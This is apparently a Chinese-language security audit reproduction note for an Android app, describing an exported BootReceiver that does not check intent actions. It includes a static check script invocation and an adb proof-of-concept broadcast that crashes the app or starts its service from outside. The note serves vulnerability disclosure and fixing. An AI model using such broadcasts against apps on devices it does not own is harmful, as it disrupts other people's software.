# APK-05 复现说明：导出的 BootReceiver 无 action 校验

- **finding**：`APK-05`（P2，组件暴露 / 有限 DoS）
- **复现级别**：R2（静态可证）+ R3（真机 adb 广播）
- **关联位置**：`apk/src/AndroidManifest.xml:58-62`；
  `apk/src/java/top/lzj2012/toolbox/BootReceiver.java:9-13`

## 环境要求

- 静态断言：Python 3.8+。
- 运行时复现：Android 12/13/14 真机或模拟器 + `adb`；APP 已登录（本地有令牌时才会走到
  `startForegroundService`）。

## 一条可复制命令（R2 静态断言）

```bash
"C:/Users/18012/.dsh/dsh-runtimes/dsh-primary-runtime/dependencies/python/python.exe" \
  "D:/Desktop/新建文件夹/work/repro/apk-android/APK-05-bootreceiver-exported/check.py"
```

## 期望输出（关键行）

```
PASS | BootReceiver 显式 android:exported="true" → 可被任意应用显式 Intent 命中  [AndroidManifest.xml:58]
PASS | BootReceiver 未设置 android:permission（无签名级权限门槛）
PASS | intent-filter 只声明 BOOT_COMPLETED（但 exported=true 时显式 Intent 不受 filter 限制）
PASS | BootReceiver.onReceive 不校验 intent.getAction()  [BootReceiver.java:9-13]
PASS | 未捕获 ForegroundServiceStartNotAllowedException（Android 12+ 后台启动 FGS 会抛）
结论: 复现通过
```

判定标准：断言全部 PASS → 任意应用可向该组件投递显式广播；是否崩溃取决于是否有令牌。

## 运行时验证（R3，**未在本机执行**，本机无 adb/模拟器）

```bash
adb install -r LZJ-Chat-1.11.2.apk
# 先登录一次（保证 Prefs 有令牌）
adb shell am broadcast -n top.lzj2012.toolbox/.BootReceiver \
    -a top.lzj2012.toolbox.EVIL --receiver-include-background
# Android 12+：logcat 出现 FATAL EXCEPTION + ForegroundServiceStartNotAllowedException（APP 崩溃）
#            修复后：广播被忽略/服务正常但无异常
adb logcat -d | grep -iE "ForegroundServiceStartNotAllowed|AndroidRuntime"
# 旧系统（<12）：dumpsys 可看到 .WatchService 被外部拉起
adb shell dumpsys activity services top.lzj2012.toolbox | grep -i watch
```

判定标准：收到上述广播后 APP 进程崩溃（或服务被外部拉起）→ 复现成功。

## 平台依据（为什么 exported=false 不影响正常开机自启）

`BOOT_COMPLETED` 是 protected broadcast，仅由系统（SYSTEM_UID）投递；`checkComponentPermission`
对 SYSTEM_UID 直接放行，因此 `exported="false"` 的接收器仍能收到系统广播，同时挡住外部应用的
显式 Intent。修复见 `fix.md`。

## 未执行说明

本机为 Windows 桌面，**无 adb / 无 Android SDK / 无模拟器**，不能安装 APK，故只执行了 R2
静态断言（输出见 `actual-output.txt`）；R3 需上述真机条件。
